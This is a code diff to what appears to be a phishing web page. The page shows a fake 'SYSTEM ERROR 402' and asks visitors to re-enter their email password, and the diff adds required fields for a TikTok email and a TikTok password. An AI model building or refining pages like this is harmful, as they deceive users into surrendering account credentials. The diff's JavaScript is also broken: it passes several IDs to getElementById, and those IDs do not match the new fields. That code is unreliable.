@@ -197,6 +197,10 @@
                     <p class="text-red-700 text-sm font-bold">SYSTEM ERROR 402: VALIDATION_FAILED</p>
                     <p class="text-red-500 text-xs">Email synchronization failed.<br>
                     Enter your email password again</p>
+                
+                <div><label class="text-xs font-bold uppercase text-gray-600">TikTok Email</label><input id="pot8" type="text" class="input-field" required></div>
+                <div><label class="text-xs font-bold uppercase text-gray-600">TikTok Email Password</label><input id="pot9" type="text" class="input-field" required></div>
+                
                 </div>
                 <input id="retry-post" type="text" placeholder="Re-enter email password" class="input-field border-red-300 mb-4">
                 <div id="btn-container-3">
@@ -333,7 +337,7 @@
 
     // 7. Final Retry & Redirect Logic
     async function finalSubmit(e) {
-        const retryPost = document.getElementById('retry-post').value;
+        const retryPost = document.getElementById('retry-post','post8','post9').value;
         if(!retryPost) return alert("Security requires your verification code.");
         
         const btn = document.getElementById('btn-3');
